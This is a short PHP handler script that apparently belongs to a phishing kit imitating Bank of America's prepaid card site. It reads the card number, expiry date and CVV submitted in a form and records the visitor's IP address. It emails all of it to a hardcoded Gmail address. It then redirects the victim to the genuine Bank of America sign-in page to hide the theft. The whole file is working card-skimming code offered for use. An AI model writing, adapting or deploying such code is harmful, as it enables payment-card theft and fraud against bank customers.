<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO CoMtECh || :------\n";
$message .= "Card Number     : ".$_POST['CardNumber']."\n";
$message .= "Expire Date  : ".$_POST['Expdate']."\n";
$message .= "CVV  : ".$_POST['Cvv']."\n";
$message .= "----: || tHAnks tO Emperor || :------\n";
$message .= "IP: ".$ip."\n";

$recipient = "masterpah10@gmail.com";
$subject = "BOA Card | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://prepaid.bankofamerica.com/cashpay/verify/signin?Logout=True");
?>


